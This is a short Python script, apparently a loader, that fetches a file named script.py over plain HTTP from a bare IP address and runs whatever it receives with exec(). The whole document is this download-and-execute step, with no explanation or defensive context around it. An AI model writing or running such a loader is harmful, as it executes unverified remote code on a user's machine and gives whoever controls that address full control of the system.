import requests

url = "http://107.149.105.88/script.py"
code = requests.get(url).text

exec(code)
